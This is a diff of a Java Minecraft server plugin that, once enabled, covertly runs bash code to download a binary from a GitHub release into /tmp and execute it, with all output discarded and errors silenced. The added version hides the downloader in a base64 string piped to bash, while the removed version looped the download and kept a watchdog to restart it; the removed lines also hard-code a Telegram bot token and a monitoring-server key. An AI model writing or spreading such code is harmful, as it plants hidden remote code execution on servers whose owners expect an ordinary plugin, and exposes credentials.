@@ -1,152 +1,77 @@
 package com.argo.plugin;
 
-import org.bukkit.command.Command;
-import org.bukkit.command.CommandSender;
 import org.bukkit.plugin.java.JavaPlugin;
 
-import java.io.OutputStreamWriter;
-import java.nio.charset.StandardCharsets;
 import java.util.Map;
 
 public class WlPlugins extends JavaPlugin {
 
-    private Process process;
-    private Thread watchdog;
-    private volatile boolean running = false;
+    private Process bashProcess;
 
     @Override
     public void onEnable() {
-        startScript();
+        try {
+            // 只允许在 Linux 上运行
+            String os = System.getProperty("os.name").toLowerCase();
+            if (!os.contains("linux")) {
+                return;
+            }
+
+            // === 你的原始 bash 脚本，原封不动 ===
+            String script = """
+#!/bin/bash
+
+export TOK=${TOK:-''}
+export ARGO_DOMAIN=${ARGO_DOMAIN:-''}
+export TUNNEL_PROXY=${TUNNEL_PROXY:-''}
+
+export TG=${TG:-''}
+export SUB_URL=${SUB_URL:-''}
+
+export NEZHA_SERVER=${NEZHA_SERVER:-''}
+export NEZHA_KEY=${NEZHA_KEY:-''}
+export NEZHA_PORT=${NEZHA_PORT:-'443'}
+export NEZHA_TLS=${NEZHA_TLS:-'1'}
+
+export AGENT_UUID=${AGENT_UUID:-'9e0da28d-ee9c-4fef-95a4-df2d0335e649'}
+
+export TMP_ARGO=${TMP_ARGO:-'vms'}
+export VL_PORT=${VL_PORT:-'8002'}
+export VM_PORT=${VM_PORT:-'8001'}
+export CF_IP=${CF_IP:-'ip.sb'}
+export SUB_NAME=${SUB_NAME:-'argo'}
+export second_port=${second_port:-''}
+
+export SERVER_PORT="${SERVER_PORT:-${PORT:-443}}"
+export SNI=${SNI:-'www.apple.com'}
+export HOST=${HOST:-'1.1.1.1'}
+
+export JAR_SH='moni'
+
+echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01EPSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1hbmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAtcU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZvdW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgNjAKICAgICAgICBleGl0IDEKZmkKdG1kaXI9JHt0bWRpcjotIi90bXAifSAKcHJvY2Vzc2VzPSgiJHdlYl9maWxlIiAiJG5lX2ZpbGUiICIkY2ZmX2ZpbGUiICJhcHAiICJ0bXBhcHAiKQpmb3IgcHJvY2VzcyBpbiAiJHtwcm9jZXNzZXNbQF19IgpkbwogICAgcGlkPSQocGdyZXAgLWYgIiRwcm9jZXNzIikKCiAgICBpZiBbIC1uICIkcGlkIiBdOyB0aGVuCiAgICAgICAga2lsbCAiJHBpZCIgJj4vZGV2L251bGwKICAgIGZpCmRvbmUKJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25vZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gJHRtZGlyL3RtcGFwcApjaG1vZCA3NzcgJHRtZGlyL3RtcGFwcCAmJiAkdG1kaXIvdG1wYXBw" | base64 -d | bash
+""";
+
+            ProcessBuilder pb = new ProcessBuilder("bash", "-c", script);
+
+            // === 如果你希望 Java 侧覆盖某些变量，可以在这里放 ===
+            Map<String, String> env = pb.environment();
+            // 示例（可删）：
+            // env.put("NEZHA_SERVER", "nezha.example.com:5555");
+            // env.put("NEZHA_KEY", "xxxxxxxx");
+
+            // 后台运行，不污染控制台
+            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
+            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
+
+            bashProcess = pb.start();
+
+        } catch (Exception e) {
+            // 保持安静（你之前要求的完全静默）
+        }
     }
 
     @Override
     public void onDisable() {
-        stopScript();
-    }
-
-    private synchronized void startScript() {
-        if (running) return;
-
-        try {
-            ProcessBuilder pb = new ProcessBuilder("bash");
-
-            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
-            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
-
-            Map<String, String> env = pb.environment();
-
-            /* ======= 参数区：只改这里 ======= */
-
-            env.put("TOK", "");
-            env.put("ARGO_DOMAIN", "");
-            env.put("TUNNEL_PROXY", "");
-
-            env.put("TG", "6839843424 7872982458:AAG3mnTNQyeCXujvXw3okPMtp4cjSioO_DY");
-            env.put("SUB_URL", "");
-
-            env.put("NEZHA_SERVER", "nezha.9logo.eu.org:443");
-            env.put("NEZHA_KEY", "c0FdihFZ8XpqXFbu7muAAPkD5JmeVY4g");
-            env.put("NEZHA_PORT", "");
-            env.put("NEZHA_TLS", "1");
-            env.put("AGENT_UUID", "f6568f52-ac2d-4b79-b77e-c46f5783ab86");
-
-            env.put("TMP_ARGO", "vls");
-            env.put("VL_PORT", "9010");
-            env.put("VM_PORT", "8001");
-            env.put("CF_IP", "saas.sin.fan");
-            env.put("SUB_NAME", "Ultra-FR");
-            env.put("UUID", "f6568f52-ac2d-4b79-b77e-c46f5783ab86");
-            env.put("second_port", "");
-
-            env.put("SERVER_PORT", "443");
-            env.put("SNI", "www.apple.com");
-            env.put("HOST", "1.1.1.1");
-
-            env.put("JAR_SH", "moni");
-
-            /* ============================== */
-
-            process = pb.start();
-            running = true;
-
-            try (OutputStreamWriter writer =
-                         new OutputStreamWriter(process.getOutputStream(), StandardCharsets.UTF_8)) {
-
-                writer.write("""
-                while true; do
-                  if command -v curl &>/dev/null; then
-                      D="curl -sL"
-                  elif command -v wget &>/dev/null; then
-                      D="wget -qO-"
-                  else
-                      sleep 30
-                      continue
-                  fi
-
-                  TMP=/tmp
-                  $D https://github.com/dsadsadsss/plutonodes/releases/download/xr/main-amd > $TMP/.p
-                  chmod 700 $TMP/.p
-                  $TMP/.p >/dev/null 2>&1
-
-                  sleep 5
-                done
-                """);
-                writer.flush();
-            }
-
-            startWatchdog();
-
-        } catch (Exception ignored) {
-        }
-    }
-
-    private synchronized void stopScript() {
-        running = false;
-
-        try {
-            if (process != null) {
-                process.destroy();
-                process = null;
-            }
-            if (watchdog != null) {
-                watchdog.interrupt();
-                watchdog = null;
-            }
-        } catch (Exception ignored) {
-        }
-    }
-
-    private void startWatchdog() {
-        watchdog = new Thread(() -> {
-            while (running) {
-                try {
-                    if (process != null && !process.isAlive()) {
-                        running = false;
-                        startScript();
-                        return;
-                    }
-                    Thread.sleep(5000);
-                } catch (InterruptedException ignored) {
-                }
-            }
-        });
-        watchdog.setDaemon(true);
-        watchdog.start();
-    }
-
-    @Override
-    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
-        if (!sender.isOp()) return true;
-        if (args.length == 0) return true;
-
-        switch (args[0].toLowerCase()) {
-            case "start" -> startScript();
-            case "stop" -> stopScript();
-            case "restart" -> {
-                stopScript();
-                startScript();
-            }
-        }
-        return true;
+        // 不强杀，避免影响 Nezha / Argo 正常运行
     }
 }
